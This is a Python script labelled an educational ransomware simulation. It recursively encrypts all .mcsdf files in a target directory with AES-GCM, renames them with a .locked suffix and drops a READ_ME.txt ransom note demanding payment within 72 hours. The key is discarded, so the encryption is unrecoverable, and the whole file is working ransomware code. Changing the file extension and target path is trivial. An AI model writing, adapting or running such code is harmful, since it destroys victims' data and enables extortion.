"""
Basic Ransomware Simulation - Educational tool that demonstrates 
fundamental ransomware encryption techniques for academic research 
and malware detection testing, designed to encrypt test files with 
AES-GCM encryption while providing controlled learning environment.
"""
import sys
import os
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def create_encryption_key():
    """
    description: Generates AES-GCM encryption key and nonce for ransomware file encryption using 256-bit security standard
    parameters: None
    returns: tuple containing AESGCM cipher object and 12-byte random nonce for authenticated encryption process
    """
    key = AESGCM.generate_key(bit_length=256)
    aes = AESGCM(key)
    nonce = os.urandom(12)
    return aes,nonce

def lock_file(text):
    """
    description: Renames encrypted file by appending .locked extension to indicate ransomware processing status
    parameters: text (Path) - Path object representing the file to be renamed and marked as encrypted
    returns: None, modifies filesystem by renaming the target file with .locked suffix for identification
    """
    locked_path = text.with_suffix(text.suffix + ".locked")
    text.rename(locked_path)

def write_ransom_message(target_path):
    """
    description: Creates standard ransom note file with payment demands and recovery instructions for ransomware simulation
    parameters: target_path (Path) - Directory path where the READ_ME.txt ransom note will be created
    returns: None, writes ransom note file to target directory containing typical ransomware messaging
    """
    ransom_note_path = target_path / "READ_ME.txt"
    ransom_note = (
        "All your important files have been encrypted.",
        "Do not attempt to rename, modify, or decrypt the files yourself, as this may result in permanent data loss.",
        "To recover your files:",
        "1. Do not shut down or restart your computer.",
        "2. Contact us at: [ransom_email@example.com] with your unique ID: [ID]",
        "3. You will receive payment instructions and a decryption tool.",
        "You have 72 hours to comply. Failure to pay within this timeframe may result in your files being permanently inaccessible.",
        "Do not attempt to use third-party recovery tools. Only our decryption tool can restore your files.",
        "We guarantee that after payment, you will receive full access to your data.",
        "This is not a joke."
    )
    ransom_note_text = "\n".join(ransom_note)
    ransom_note_path.write_text(ransom_note_text)

def execute_ransomware(target_path: Path):
    """
    description: Executes main ransomware encryption process by encrypting all .mcsdf files with AES-GCM and renaming them
    parameters: target_path (Path) - Root directory to recursively search for .mcsdf files to encrypt
    returns: None, encrypts and renames all .mcsdf files found in target directory tree for educational demonstration
    """
    aes, nonce = create_encryption_key()
    for text in target_path.rglob("*.mcsdf"):
        buffer = text.read_bytes()
        ciphertext = aes.encrypt(nonce, buffer, None)
        text.write_bytes(ciphertext)
        lock_file(text)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <target_directory>")
        sys.exit(1)
    
    target_directory = Path(sys.argv[1])
    target_directory.mkdir(parents=True, exist_ok=True)  # Create directory if it doesn't exist
    execute_ransomware(target_directory)
    write_ransom_message(target_directory)